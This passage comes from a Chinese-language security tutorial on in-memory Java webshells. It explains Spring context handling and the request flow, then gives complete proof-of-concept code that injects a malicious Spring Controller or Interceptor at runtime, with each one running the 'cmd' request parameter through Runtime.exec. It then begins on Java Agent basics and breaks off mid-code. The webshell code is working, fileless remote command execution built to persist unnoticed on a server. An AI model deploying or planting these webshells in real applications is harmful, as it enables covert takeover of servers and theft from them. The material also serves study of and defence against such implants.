`Spring`容器就是`ApplicationContext`，它是一个接口继承于`BeanFactory`，有很多实现类。获得了`ApplicationContext`的实例，就获得了`IoC`容器的引用。我们可以从`ApplicationContext`中可以根据`Bean`的`ID`获取`Bean`。
![image.png](https://ckcsec.oss-cn-hangzhou.aliyuncs.com/img/1712886447405-ee02ed02-c146-479d-acce-b3b979adaa4b.png)
因此，`org.springframework.context.ApplicationContext`接口也代表了 `IoC`容器 ，它负责实例化、定位、配置应用程序中的对象(`bean`)及建立这些对象间(`beans`)的依赖。

### 5.2.4、Root Context和Child Context

先看`web.xml`配置

```xml
...
  <servlet>
    <servlet-name>spring</servlet-name>
    <servlet-class>org.springframework.web.servlet.DispatcherServlet</servlet-class>
    <init-param>
      <param-name>contextConfigLocation</param-name>
      <param-value>/WEB-INF/springmvc.xml</param-value>
    </init-param>
    <load-on-startup>1</load-on-startup>
  </servlet>
  <servlet-mapping>
    <servlet-name>spring</servlet-name>
    <url-pattern>/</url-pattern>
  </servlet-mapping>
...
```

这里我们将`DispatcherServlet`设置别名为`spring`，然后将`contextConfigLocation` 参数值配置为`/WEB-INF/springmvc.xml`。
依照规范，当没有显式配置 `contextConfigLocation` 时，程序会自动寻找` /WEB-INF/<servlet-name>-servlet.xml`，作为配置文件。因为上面的 `<servlet-name>` 是 `dispatcherServlet`，所以当没有显式配置时，程序依然会自动找到` /WEB-INF/dispatcherServlet-servlet.xml` 配置文件。
每个具体的 `DispatcherServlet` 创建的是一个 `Child Context`，代表一个独立的 `IoC` 容器；而 `ContextLoaderListener` 所创建的是一个 `Root Context`，代表全局唯一的一个公共 `IoC` 容器。
如果要访问和操作 `bean` ，一般要获得当前代码执行环境的`IoC` 容器 代表者 `ApplicationContext`。

- `Spring` 应用中可以同时有多个 `Context`，其中只有一个 `Root Context`，剩下的全是 `Child Context`
- 所有`Child Context`都可以访问在 `Root Context`中定义的 `bean`，但是`Root Context`无法访问`Child Context`中定义的 `bean`
- 所有的`Context`在创建后，都会被作为一个属性添加到了 `ServletContext`中

### 5.2.5、ContextLoaderListener

`ContextLoaderListener` 主要被用来初始化全局唯一的`Root Context`，即 `Root WebApplicationContext`。这个 `Root WebApplicationContext` 会和其他 `Child Context`实例共享它的 `IoC` 容器，供其他 `Child Context` 获取并使用容器中的 `bean`。

### 5.2.6、实现思路

和`Tomcat`内存马类似，我们就需要了解如何动态的注册`Controller`，思路如下

1. 获取上下文环境
2. 注册恶意`Controller`
3. 配置路径映射

### 5.2.7、获取上下文环境的Context

四种方法

#### 5.2.7.1、getCurrentWebApplicationContext

```java
WebApplicationContext context = ContextLoader.getCurrentWebApplicationContext();
```

`getCurrentWebApplicationContext` 获得的是一个 `XmlWebApplicationContext` 实例类型的 `Root WebApplicationContext`。

#### 5.2.7.2、WebApplicationContextUtils

```java
WebApplicationContext context = WebApplicationContextUtils.getWebApplicationContext(RequestContextUtils.getWebApplicationContext(((ServletRequestAttributes)RequestContextHolder.currentRequestAttributes()).getRequest()).getServletContext());
```

通过这种方法获得的也是一个 `Root WebApplicationContext`。其中`WebApplicationContextUtils.getWebApplicationContext `函数也可以用 `WebApplicationContextUtils.getRequiredWebApplicationContext`来替换。

#### 5.2.7.3、RequestContextUtils

```java
WebApplicationContext context = RequestContextUtils.getWebApplicationContext(((ServletRequestAttributes)RequestContextHolder.currentRequestAttributes()).getRequest());
```

通过 `ServletRequest` 类的实例来获得 `Child WebApplicationContext`。

#### 5.2.7.4、getAttribute

```java
WebApplicationContext context = (WebApplicationContext)RequestContextHolder.currentRequestAttributes().getAttribute("org.springframework.web.servlet.DispatcherServlet.CONTEXT", 0);
```

这种方式与前几种的思路就不太一样了，因为所有的`Context`在创建后，都会被作为一个属性添加到了`ServletContext`中。所以通过直接获得`ServletContext`通过属性`Context`拿到 `Child WebApplicationContext`

### 5.2.8、动态注册Controller

`Spring Controller` 的动态注册，就是对 `RequestMappingHandlerMapping` 注入的过程。
`RequestMappingHandlerMapping`是`springMVC`里面的核心`Bean`，`spring`把我们的`controller`解析成`RequestMappingInfo`对象，然后再注册进`RequestMappingHandlerMapping`中，这样请求进来以后就可以根据请求地址调用到`Controller`类里面了。

- `RequestMappingHandlerMapping`对象本身是`spring`来管理的，可以通过`ApplicationContext`取到，所以并不需要我们新建。
- 在`SpringMVC`框架下，会有两个`ApplicationContext`，一个是`Spring IOC`的上下文，这个是在`java web`框架的`Listener`里面配置，就是我们经常用的`web.xml`里面的`org.springframework.web.context.ContextLoaderListener`，由它来完成`IOC`容器的初始化和`bean`对象的注入。
- 另外一个是`ApplicationContext`是由`org.springframework.web.servlet.DispatcherServlet`完成的，具体是在`org.springframework.web.servlet.FrameworkServlet#initWebApplicationContext()`这个方法做的。而这个过程里面会完成`RequestMappingHandlerMapping`这个对象的初始化。

`Spring 2.5` 开始到 `Spring 3.1 `之前一般使用
`org.springframework.web.servlet.mvc.annotation.DefaultAnnotationHandlerMapping`
映射器 ；
`Spring 3.1` 开始及以后一般开始使用新的
`org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping`
映射器来支持`@Contoller`和`@RequestMapping`注解。
![image.png](https://ckcsec.oss-cn-hangzhou.aliyuncs.com/img/1712888325172-cb319752-eb4e-4176-9bcd-bd323b5a78bc.png)

#### 5.2.8.1、registerMapping

在`Spring 4.0`及以后，可以使用`registerMapping`直接注册`requestMapping`

```java
// 1. 从当前上下文环境中获得 RequestMappingHandlerMapping 的实例 bean
RequestMappingHandlerMapping r = context.getBean(RequestMappingHandlerMapping.class);
// 2. 通过反射获得自定义 controller 中唯一的 Method 对象
Method method = (Class.forName("me.landgrey.SSOLogin").getDeclaredMethods())[0];
// 3. 定义访问 controller 的 URL 地址
PatternsRequestCondition url = new PatternsRequestCondition("/hahaha");
// 4. 定义允许访问 controller 的 HTTP 方法（GET/POST）
RequestMethodsRequestCondition ms = new RequestMethodsRequestCondition();
// 5. 在内存中动态注册 controller
RequestMappingInfo info = new RequestMappingInfo(url, ms, null, null, null, null, null);
r.registerMapping(info, Class.forName("恶意Controller").newInstance(), method);
```

#### 5.2.8.2、registerhandler

参考上面的 `HandlerMapping` 接口继承关系图，针对使用 `DefaultAnnotationHandlerMapping` 映射器的应用，可以找到它继承的顶层类`org.springframework.web.servlet.handler.AbstractUrlHandlerMapping`在其`registerHandler()`方法中

```java
protected void registerHandler(String urlPath, Object handler) throws BeansException, IllegalStateException {
    Assert.notNull(urlPath, "URL path must not be null");
    Assert.notNull(handler, "Handler object must not be null");
    Object resolvedHandler = handler;

    // Eagerly resolve handler if referencing singleton via name.
    if (!this.lazyInitHandlers && handler instanceof String) {
        String handlerName = (String) handler;
        ApplicationContext applicationContext = obtainApplicationContext();
        if (applicationContext.isSingleton(handlerName)) {
            resolvedHandler = applicationContext.getBean(handlerName);
        }
    }

    Object mappedHandler = this.handlerMap.get(urlPath);
    if (mappedHandler != null) {
        if (mappedHandler != resolvedHandler) {
            throw new IllegalStateException(
                    "Cannot map " + getHandlerDescription(handler) + " to URL path [" + urlPath +
                    "]: There is already " + getHandlerDescription(mappedHandler) + " mapped.");
        }
    }
    else {
        if (urlPath.equals("/")) {
            if (logger.isTraceEnabled()) {
                logger.trace("Root mapping to " + getHandlerDescription(handler));
            }
            setRootHandler(resolvedHandler);
        }
        else if (urlPath.equals("/*")) {
            if (logger.isTraceEnabled()) {
                logger.trace("Default mapping to " + getHandlerDescription(handler));
            }
            setDefaultHandler(resolvedHandler);
        }
        else {
            this.handlerMap.put(urlPath, resolvedHandler);
            if (getPatternParser() != null) {
                this.pathPatternHandlerMap.put(getPatternParser().parse(urlPath), resolvedHandler);
            }
            if (logger.isTraceEnabled()) {
                logger.trace("Mapped [" + urlPath + "] onto " + getHandlerDescription(handler));
            }
        }
    }
}
```

该方法接受 `urlPath`参数和 `handler`参数，可以在 `this.getApplicationContext()` 获得的上下文环境中寻找名字为 `handler` 参数值的 `bean`, 将 `url` 和 `controller` 实例 `bean` 注册到 `handlerMap` 中

```java
// 1. 在当前上下文环境中注册一个名为 dynamicController 的 Webshell controller 实例 bean
context.getBeanFactory().registerSingleton("dynamicController", Class.forName("me.landgrey.SSOLogin").newInstance());
// 2. 从当前上下文环境中获得 DefaultAnnotationHandlerMapping 的实例 bean
org.springframework.web.servlet.mvc.annotation.DefaultAnnotationHandlerMapping  dh = context.getBean(org.springframework.web.servlet.mvc.annotation.DefaultAnnotationHandlerMapping.class);
// 3. 反射获得 registerHandler Method
java.lang.reflect.Method m1 = org.springframework.web.servlet.handler.AbstractUrlHandlerMapping.class.getDeclaredMethod("registerHandler", String.class, Object.class);
m1.setAccessible(true);
// 4. 将 dynamicController 和 URL 注册到 handlerMap 中
m1.invoke(dh, "/favicon", "dynamicController");
```

#### 5.2.8.3、detectHandlerMethods

参考上面的 `HandlerMapping` 接口继承关系图，针对使用 `RequestMappingHandlerMapping` 映射器的应用，可以找到它继承的顶层类`org.springframework.web.servlet.handler.AbstractHandlerMethodMapping`在其`detectHandlerMethods()` 方法中

```java
protected void detectHandlerMethods(Object handler) {
    Class<?> handlerType = handler instanceof String ? this.getApplicationContext().getType((String)handler) : handler.getClass();
    final Class<?> userType = ClassUtils.getUserClass(handlerType);
    Set<Method> methods = HandlerMethodSelector.selectMethods(userType, new MethodFilter() {
        public boolean matches(Method method) {
            return AbstractHandlerMethodMapping.this.getMappingForMethod(method, userType) != null;
        }
    });
    Iterator var6 = methods.iterator();
    while(var6.hasNext()) {
        Method method = (Method)var6.next();
        T mapping = this.getMappingForMethod(method, userType);
        this.registerHandlerMethod(handler, method, mapping);
    }
}
```

该方法仅接受`handler`参数，同样可以在 `this.getApplicationContext()` 获得的上下文环境中寻找名字为 `handler` 参数值的 `bean`, 并注册 `controller` 的实例 `bean`

```java
context.getBeanFactory().registerSingleton("dynamicController", Class.forName("恶意Controller").newInstance());
org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping requestMappingHandlerMapping = context.getBean(org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping.class);
java.lang.reflect.Method m1 = org.springframework.web.servlet.handler.AbstractHandlerMethodMapping.class.getDeclaredMethod("detectHandlerMethods", Object.class);
m1.setAccessible(true);
m1.invoke(requestMappingHandlerMapping, "dynamicController");
```

### 5.2.9、实现恶意的Controller

这里由于我们时动态注册`Controller`，所以我们只需要实现对应的恶意方法即可

```java
public class Controller_Shell{
 
        public Controller_Shell(){}
 
        public void shell() throws IOException {
 
            //获取request
            HttpServletRequest request = ((ServletRequestAttributes) (RequestContextHolder.currentRequestAttributes())).getRequest();
            Runtime.getRuntime().exec(request.getParameter("cmd"));
        }
    }
```

### 5.2.10、完整POC

```java
package com.controller;

import org.springframework.stereotype.Controller;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.context.WebApplicationContext;
import org.springframework.web.context.request.RequestContextHolder;
import org.springframework.web.context.request.ServletRequestAttributes;
import org.springframework.web.servlet.mvc.condition.PatternsRequestCondition;
import org.springframework.web.servlet.mvc.condition.RequestMethodsRequestCondition;
import org.springframework.web.servlet.mvc.method.RequestMappingInfo;
import org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping;

import javax.servlet.http.HttpServletRequest;
import java.io.IOException;
import java.lang.reflect.Method;

@Controller
public class shell_controller {

    //@ResponseBody
    @RequestMapping("/control")
    public void Spring_Controller() throws ClassNotFoundException, InstantiationException, IllegalAccessException, NoSuchMethodException {

        //获取当前上下文环境
        WebApplicationContext context = (WebApplicationContext) RequestContextHolder.currentRequestAttributes().getAttribute("org.springframework.web.servlet.DispatcherServlet.CONTEXT", 0);

        //手动注册Controller
        // 1. 从当前上下文环境中获得 RequestMappingHandlerMapping 的实例 bean
        RequestMappingHandlerMapping r = context.getBean(RequestMappingHandlerMapping.class);
        // 2. 通过反射获得自定义 controller 中唯一的 Method 对象
        Method method = Controller_Shell.class.getDeclaredMethod("shell");
        // 3. 定义访问 controller 的 URL 地址
        PatternsRequestCondition url = new PatternsRequestCondition("/shell");
        // 4. 定义允许访问 controller 的 HTTP 方法（GET/POST）
        RequestMethodsRequestCondition ms = new RequestMethodsRequestCondition();
        // 5. 在内存中动态注册 controller
        RequestMappingInfo info = new RequestMappingInfo(url, ms, null, null, null, null, null);
        r.registerMapping(info, new Controller_Shell(), method);

    }

    public class Controller_Shell{

        public Controller_Shell(){}

        public void shell() throws IOException {

            //获取request
            HttpServletRequest request = ((ServletRequestAttributes) (RequestContextHolder.currentRequestAttributes())).getRequest();
            Runtime.getRuntime().exec(request.getParameter("cmd"));
        }
    }

}
```

首先访问`/control`路由，由于`Controller`默认会将结果交给View`处理`，返回值通常会被解析成一个页面路径，所以这里会报`404`错误。我们可以使用`@ResponeBody`来将`Controller`的方法返回的对象，通过适当的`HttpMessageConverter`转换为指定格式后，写入到`Response`对象的`body`数据区。
![image.png](https://ckcsec.oss-cn-hangzhou.aliyuncs.com/img/1712889159796-55c8a568-c626-49b2-8e11-fd25e09bc50a.png)
然后访问我们定义恶意`Controller`的路由`/shell`
![image.png](https://ckcsec.oss-cn-hangzhou.aliyuncs.com/img/1712889216419-5c1cf809-d122-4876-89cc-436645b2d73f.png)

## 5.3、Interceptor

### 5.3.1、什么是 Interceptor

`Spring MVC` 的拦截器（`Interceptor`）与 `Java Servlet` 的过滤器（`Filter`）类似，它主要用于拦截用户的请求并做相应的处理，通常应用在权限验证、记录请求信息的日志、判断用户是否登录等功能上。
在 `Spring MVC` 框架中定义一个拦截器需要对拦截器进行定义和配置，主要有以下 2 种方式。

- 通过实现 `HandlerInterceptor` 接口或继承 `HandlerInterceptor` 接口的实现类（例如 `HandlerInterceptorAdapter`）来定义
- 通过实现 `WebRequestInterceptor` 接口或继承 `WebRequestInterceptor` 接口的实现类来定义

### 5.3.2、Interceptor示例

这里我们选择继承`HandlerInterceptor`接口来实现一个`Interceptor`。`HandlerInterceptor`接口有三个方法，如下

- `preHandle`：该方法在控制器的处理请求方法前执行，其返回值表示是否中断后续操作，返回 `true` 表示继续向下执行，返回 `false` 表示中断后续操作。
- `postHandle`：该方法在控制器的处理请求方法调用之后、解析视图之前执行，可以通过此方法对请求域中的模型和视图做进一步的修改。
- `afterCompletion`：该方法在控制器的处理请求方法执行完成后执行，即视图渲染结束后执行，可以通过此方法实现一些资源清理、记录日志信息等工作。

```java
package com.shell.interceptor;
 
import org.springframework.web.servlet.HandlerInterceptor;
 
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.PrintWriter;
 
public class Spring_Interceptor implements HandlerInterceptor {
    @Override
    public boolean preHandle(HttpServletRequest request, HttpServletResponse response, Object handler) throws Exception {
        String url = request.getRequestURI();
        PrintWriter writer = response.getWriter();
        //如果请求路径为/login则放行
        if ( url.indexOf("/login") >= 0){
            writer.write("LoginIn");
            writer.flush();
            writer.close();
            return true;
        }
        writer.write("LoginInFirst");
        writer.flush();
        writer.close();
        return false;
    }
}
```

在`springmvc.xml`配置文件中配置相应的`Interceptor`

```xml
<mvc:interceptors>
    <mvc:interceptor>
        <mvc:mapping path="/*"/>
        <bean class="com.interceptor.InterceptorDemo" />
    </mvc:interceptor>
</mvc:interceptors>
```

编写对应的`Controller`

```java
package com.controller;


import org.springframework.stereotype.Controller;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.ResponseBody;

@Controller
public class LoginController {
    @ResponseBody
    @RequestMapping("login")
    public String Login() {
        return "Success";
    }
}

```

访问对应路径
![image.png](https://ckcsec.oss-cn-hangzhou.aliyuncs.com/img/1712892109028-ebd31cb7-94ba-499e-a266-340434837d6f.png)

### 5.3.3、request调用流程

我们首先来探究一下，当一个`Request`发送到`Spring`应用时，是如何一步步到达业务逻辑处理层`Controller`的。
在`ApplicationFilterChain#internalDoFilter`处下一个断点，可以看到此时的调用栈是和启动`Tomcat`时相同的
![image.png](https://ckcsec.oss-cn-hangzhou.aliyuncs.com/img/1712902049494-1b3098e5-bbf2-426e-bd3b-890bc700e465.png)
但与`Tomcat`不同的是，当调用到`HttpServlet#service`时，最终会调用`DispatcherServlet#doDispatch`进行逻辑处理，这正是`Spring`的逻辑处理核心类。
![image.png](https://ckcsec.oss-cn-hangzhou.aliyuncs.com/img/1712902143176-8737777a-91f7-4275-8976-9ec85a7dc3c0.png)

```java
doDispatch:1028, DispatcherServlet (org.springframework.web.servlet)
doService:963, DispatcherServlet (org.springframework.web.servlet)
processRequest:1006, FrameworkServlet (org.springframework.web.servlet)
doGet:898, FrameworkServlet (org.springframework.web.servlet)
service:655, HttpServlet (javax.servlet.http)
service:883, FrameworkServlet (org.springframework.web.servlet)
service:764, HttpServlet (javax.servlet.http)
internalDoFilter:227, ApplicationFilterChain (org.apache.catalina.core)
doFilter:162, ApplicationFilterChain (org.apache.catalina.core)

...
```

跟进到`getHandler`方法
![image.png](https://ckcsec.oss-cn-hangzhou.aliyuncs.com/img/1712902288319-7d235af5-4b67-441c-bac8-aefd41eb23bd.png)

```java
protected HandlerExecutionChain getHandler(HttpServletRequest request) throws Exception {
    if (this.handlerMappings != null) {
        for (HandlerMapping mapping : this.handlerMappings) {
            HandlerExecutionChain handler = mapping.getHandler(request);
            if (handler != null) {
                return handler;
            }
        }
    }
    return null;
}
```

在 `getHandler` 方法中，会通过遍历 `this.handlerMappings` 来获取 `HandlerMapping` 对象实例 `mapping`
而`getHandler`实际上会调用`org.springframework.web.servlet.handler.AbstractHandlerMapping` 类的 `getHandler` 方法，并通过 `getHandlerExecutionChain(handler, request) `方法返回 `HandlerExecutionChain` 类的实例
![image.png](https://ckcsec.oss-cn-hangzhou.aliyuncs.com/img/1712902923516-8ba0bfb1-3a34-4351-844a-0c0f36ca1c1d.png)
![image.png](https://ckcsec.oss-cn-hangzhou.aliyuncs.com/img/1712902579235-30743abe-0080-4067-85da-307f9dc0e922.png)

```java
protected HandlerExecutionChain getHandlerExecutionChain(Object handler, HttpServletRequest request) {
		HandlerExecutionChain chain = (handler instanceof HandlerExecutionChain ?
				(HandlerExecutionChain) handler : new HandlerExecutionChain(handler));
 
		for (HandlerInterceptor interceptor : this.adaptedInterceptors) {
			if (interceptor instanceof MappedInterceptor) {
				MappedInterceptor mappedInterceptor = (MappedInterceptor) interceptor;
				if (mappedInterceptor.matches(request)) {
					chain.addInterceptor(mappedInterceptor.getInterceptor());
				}
			}
			else {
				chain.addInterceptor(interceptor);
			}
		}
		return chain;
	}
```

可以看到其通过`adaptedInterceptors`获取所有`Interceptor`后进行遍历，其中可以看见一个我们自己定义的`Interceptor`
然后通过`chain.addInterceptor()`将所有`Interceptor`添加到`HandlerExecutionChain`中。最后返回到`DispatcherServlet#doDispatch()`中，调用`mappedHandler.applyPreHandle`方法
![image.png](https://ckcsec.oss-cn-hangzhou.aliyuncs.com/img/1712902944246-e36dd5e7-ed94-44c8-a15d-d6aa5fed52a3.png)
![image.png](https://ckcsec.oss-cn-hangzhou.aliyuncs.com/img/1712902956886-4982796a-7bd5-4c0a-ba87-867f40fb02d1.png)

```java
boolean applyPreHandle(HttpServletRequest request, HttpServletResponse response) throws Exception {
		for (int i = 0; i < this.interceptorList.size(); i++) {
			HandlerInterceptor interceptor = this.interceptorList.get(i);
			if (!interceptor.preHandle(request, response, this.handler)) {
				triggerAfterCompletion(request, response, null);
				return false;
			}
			this.interceptorIndex = i;
		}
		return true;
	}
```

然后遍历调用`Interceptor`中的`preHandle()`拦截方法。
因此当一个`Request`发送到`Spring`应用时，大致会经过如下几个层面才会进入`Controller`层

```java
HttpRequest --> Filter --> DispactherServlet --> Interceptor --> Controller
```

### 5.3.4、Interceptor型内存马实现思路

通过以上分析，`Interceptor`实际上是可以拦截所有想到达`Controller`的请求的。下面的问题就是如何动态地注册一个恶意的`Interceptor`了。由于`Interceptor`和`Filter`有一定的相似之处，因此我们可以仿照`Filter`型内存马的实现思路

- 获取当前运行环境的上下文
- 实现恶意`Interceptor`
- 注入恶意`Interceptor`

### 5.3.5、获取环境上下文

在`Controller`型内存马中，给出了四种获取`Spring`上下文`ApplicationContext`的方法。下面我们还可以通过反射获取`LiveBeansView`类的`applicationContexts` 属性来获取上下文。

```java
// 1. 反射 org.springframework.context.support.LiveBeansView 类 applicationContexts 属性
java.lang.reflect.Field filed = Class.forName("org.springframework.context.support.LiveBeansView").getDeclaredField("applicationContexts");
// 2. 属性被 private 修饰，所以 setAccessible true
filed.setAccessible(true);
// 3. 获取一个 ApplicationContext 实例
org.springframework.web.context.WebApplicationContext context =(org.springframework.web.context.WebApplicationContext) ((java.util.LinkedHashSet)filed.get(null)).iterator().next();
```

`org.springframework.context.support.LiveBeansView `类在 `spring-context 3.2.x `版本（现在最新版本是 `5.3.x`）才加入其中，所以比较低版本的 `spring` 无法通过此方法获得 `ApplicationContext` 的实例。

获取**adaptedInterceptor属性值**
获得 `ApplicationContext` 实例后，还需要知道 `org.springframework.web.servlet.handler.AbstractHandlerMapping` 类实例的 `bean name` 叫什么。
![image.png](https://ckcsec.oss-cn-hangzhou.aliyuncs.com/img/1712904274313-fac41adc-d9bb-4d2f-b2d6-d59520a42854.png)
我们可以通过`ApplicationContext`上下文来获取`AbstractHandlerMapping`，进而反射获取`adaptedInterceptors`属性值

```java
org.springframework.web.servlet.handler.AbstractHandlerMapping abstractHandlerMapping = (org.springframework.web.servlet.handler.AbstractHandlerMapping)context.getBean("requestMappingHandlerMapping");
java.lang.reflect.Field field = org.springframework.web.servlet.handler.AbstractHandlerMapping.class.getDeclaredField("adaptedInterceptors");
field.setAccessible(true);
java.util.ArrayList<Object> adaptedInterceptors = (java.util.ArrayList<Object>)field.get(abstractHandlerMapping);
```

### 5.4.6、实现恶意的Interceptor

这里选择继承`HandlerInterceptor`类，并重写其`preHandle`方法

```java
package com.shell.interceptor;
 
import org.springframework.web.servlet.HandlerInterceptor;
 
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.IOException;
 
public class Shell_Interceptor implements HandlerInterceptor {
 
    @Override
    public boolean preHandle(HttpServletRequest request, HttpServletResponse response, Object handler) throws Exception {
        String cmd = request.getParameter("cmd");
        if (cmd != null) {
            try {
                Runtime.getRuntime().exec(cmd);
            } catch (IOException e) {
                e.printStackTrace();
            } catch (NullPointerException n) {
                n.printStackTrace();
            }
            return true;
        }
        return false;
    }
}
```

### 5.4.7、动态注册Interceptor

我们知道`Spring`是通过遍历`adaptedInterceptors`属性值来执行`Interceptor`的，因此最后我们只需要将恶意`Interceptor`加入到 `adaptedInterceptors` 属性值中就可以了。

```java
//将恶意Interceptor添加入adaptedInterceptors
Shell_Interceptor shell_interceptor = new Shell_Interceptor();
adaptedInterceptors.add(shell_interceptor);
```

### 5.4.8、完整POC

```java
package com.shell.controller;
 
import org.springframework.stereotype.Controller;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.ResponseBody;
import org.springframework.web.context.WebApplicationContext;
import org.springframework.web.context.request.RequestContextHolder;
import org.springframework.web.context.request.ServletRequestAttributes;
import org.springframework.web.servlet.HandlerInterceptor;
import org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping;
import org.springframework.web.servlet.support.RequestContextUtils;
 
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.IOException;
 
@Controller
public class Inject_Shell_Interceptor_Controller {
 
    @ResponseBody
    @RequestMapping("/inject")
    public void Inject() throws ClassNotFoundException, NoSuchFieldException, IllegalAccessException {
 
        //获取上下文环境
        WebApplicationContext context = RequestContextUtils.findWebApplicationContext(((ServletRequestAttributes) RequestContextHolder.currentRequestAttributes()).getRequest());
 
        //获取adaptedInterceptors属性值
        org.springframework.web.servlet.handler.AbstractHandlerMapping abstractHandlerMapping = (org.springframework.web.servlet.handler.AbstractHandlerMapping)context.getBean(RequestMappingHandlerMapping.class);
        java.lang.reflect.Field field = org.springframework.web.servlet.handler.AbstractHandlerMapping.class.getDeclaredField("adaptedInterceptors");
        field.setAccessible(true);
        java.util.ArrayList<Object> adaptedInterceptors = (java.util.ArrayList<Object>)field.get(abstractHandlerMapping);
 
 
        //将恶意Interceptor添加入adaptedInterceptors
        Shell_Interceptor shell_interceptor = new Shell_Interceptor();
        adaptedInterceptors.add(shell_interceptor);
    }
 
    public class Shell_Interceptor implements HandlerInterceptor{
        @Override
        public boolean preHandle(HttpServletRequest request, HttpServletResponse response, Object handler) throws Exception {
            String cmd = request.getParameter("cmd");
            if (cmd != null) {
                try {
                    Runtime.getRuntime().exec(cmd);
                } catch (IOException e) {
                    e.printStackTrace();
                } catch (NullPointerException n) {
                    n.printStackTrace();
                }
                return true;
            }
            return false;
        }
    }
}
```

![image.png](https://ckcsec.oss-cn-hangzhou.aliyuncs.com/img/1713146130547-0518464d-0cd0-480c-b812-d1408bb4627c.png)
注意需要在配置文件中修改此处
![image.png](https://ckcsec.oss-cn-hangzhou.aliyuncs.com/img/1713146149434-788acec0-1b1c-49ac-bc1b-35e96c1acf52.png)

# 6、Java Agent内存马

## 6.1、什么是Java Agent

我们知道`Java`是一种静态强类型语言，在运行之前必须将其编译成`.class`字节码，然后再交给`JVM`处理运行。`Java Agent`就是一种能在不影响正常编译的前提下，修改`Java`字节码，进而动态地修改已加载或未加载的类、属性和方法的技术。
实际上，平时较为常见的技术如热部署、一些诊断工具等都是基于`Java Agent`技术来实现的。那么`Java Agent`技术具体是怎样实现的呢？
对于`Agent`（代理）来讲，其大致可以分为两种，一种是在`JVM`启动前加载的`premain-Agent`，另一种是`JVM`启动之后加载的`agentmain-Agent`。这里我们可以将其理解成一种特殊的`Interceptor`（拦截器），如下图
![](https://ckcsec.oss-cn-hangzhou.aliyuncs.com/img/1713146404725-e14f79a1-1f7e-4bb2-b8ad-a6a3dbe47195.png)
![](https://ckcsec.oss-cn-hangzhou.aliyuncs.com/img/1713146410461-1d6065e5-456d-48d8-9dd7-82f500090178.png)

## 6.2、Java Agent示例

### 6.2.1、Premain-Agent

我们首先来实现一个简单的`premain-Agent`，创建一个`Maven`项目，编写一个简单的`premain-Agent`

```java
package com.java.premain.agent;

import java.lang.instrument.Instrumentation;

public class Java_Agent_premain {
    public static void premain(String args, Instrumentation inst) {
        for (int i =0 ; i<10 ; i++){
            System.out.println("调用了premain-Agent！");
        }
    }
}

```

接着在`resource/META-INF/`下创建`MANIFEST.MF`清单文件用以指定`premain-Agent`的启动类

```java
Manifest-Version: 1.0
Premain-Class: com.java.premain.agent.Java_Agent_premain
```

将其打包成`jar`文件
![image.png](https://ckcsec.oss-cn-hangzhou.aliyuncs.com/img/1713237247856-d1abf234-5b94-408f-959d-9a2971ceea56.png)
![image.png](https://ckcsec.oss-cn-hangzhou.aliyuncs.com/img/1713237293032-380bbcb1-feaf-430e-a974-34b9c4128103.png)


创建一个目标类

```java
public class Hello {
    public static void main(String[] args) {
        System.out.println("Hello World!");
    }
}
```

添加`JVM Options`（注意冒号之后不能有空格）

```xml
-javaagent:"out/artifacts/pm_jar/PremainDemo.jar"     
```

运行结果如下
![image.png](https://ckcsec.oss-cn-hangzhou.aliyuncs.com/img/1713237314094-61cd4659-183c-4c44-9b7f-caca5a4d14b9.png)
**草点：需要在**`**Maven**`**模块里面新建一个**`**Maven**`**模块**

### 6.2.2、agentmain-Agent

相较于`premain-Agent`只能在JVM启动前加载，`agentmain-Agent`能够在`JVM`启动之后加载并实现相应的修改字节码功能。下面我们来了解一下和`JVM`有关的两个类。

#### 6.2.2.1、VirtualMachine类

`com.sun.tools.attach.VirtualMachine`类可以实现获取`JVM`信息，内存`dump`、现成`dump`、类信息统计（例如JVM`加`载的类）等功能。
该类允许我们通过给`attach`方法传入一个`JVM`的`PID`，来远程连接到该`JVM`上 ，之后我们就可以对连接的`JVM`进行各种操作，如注入`Agent`。下面是该类的主要方法

```java
//允许我们传入一个JVM的PID，然后远程连接到该JVM上
VirtualMachine.attach()
 
//向JVM注册一个代理程序agent，在该agent的代理程序中会得到一个Instrumentation实例，该实例可以 在class加载前改变class的字节码，也可以在class加载后重新加载。在调用Instrumentation实例的方法时，这些方法会使用ClassFileTransformer接口中提供的方法进行处理
VirtualMachine.loadAgent()
 
//获得当前所有的JVM列表
VirtualMachine.list()
 
//解除与特定JVM的连接
VirtualMachine.detach()
```

#### 6.2.2.2、VirtualMachineDescriptor类

`com.sun.tools.attach.VirtualMachineDescriptor`类是一个用来描述特定虚拟机的类，其方法可以获取虚拟机的各种信息如`PID`、虚拟机名称等。下面是一个获取特定虚拟机`PID`的示例

```java
package org.example;
import com.sun.tools.attach.VirtualMachine;
import com.sun.tools.attach.VirtualMachineDescriptor;

import java.util.List;

public class GetPid {
    public static void main(String[] args) {
        //调用VirtualMachine.list()获取正在运行的JVM列表
        List<VirtualMachineDescriptor> list = VirtualMachine.list();
        for(VirtualMachineDescriptor vmd : list){

            //遍历每一个正在运行的JVM，如果JVM名称为org.example.GetPid则返回其PID
            System.out.println(vmd);
            if(vmd.displayName().equals("org.example.GetPid"))
                System.out.println(vmd.id());
        }
    }
}

```

![image.png](https://ckcsec.oss-cn-hangzhou.aliyuncs.com/img/1713237635382-b2fb0574-96d9-4e23-85df-d10124463f33.png)
下面我们就来实现一个`agentmain-Agent`。首先我们编写一个`Sleep_Hello`类，模拟正在运行的`JVM`

```java
import static java.lang.Thread.sleep;
 
public class Sleep_Hello {
    public static void main(String[] args) throws InterruptedException {
        while (true){
            System.out.println("Hello World!");
            sleep(5000);
        }
    }
}
```

然后编写我们的`agentmain-Agent`类

```java
package com.java.agentmain.agent;
 
import java.lang.instrument.Instrumentation;
 
import static java.lang.Thread.sleep;
 
public class Java_Agent_agentmain {
    public static void agentmain(String args, Instrumentation inst) throws InterruptedException {
        while (true){
            System.out.println("调用了agentmain-Agent!");
            sleep(3000);
